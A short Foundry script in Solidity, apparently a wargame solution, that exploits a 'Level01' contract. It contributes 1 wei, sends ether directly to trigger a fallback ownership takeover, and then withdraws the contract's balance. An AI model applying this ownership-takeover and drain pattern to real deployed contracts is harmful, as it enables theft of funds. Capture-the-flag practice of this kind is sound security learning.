// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level01.sol";

contract Attacker is Script {
    Level01 level01 = Level01(payable(address(0x09140Ba48cC24236546B542316bCef50e4eA0bF3)));

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      level01.contribute{value: 1 wei}();
      address(level01).call{value: 1 wei}("");
      level01.withdraw();
      vm.stopBroadcast();
    }
}
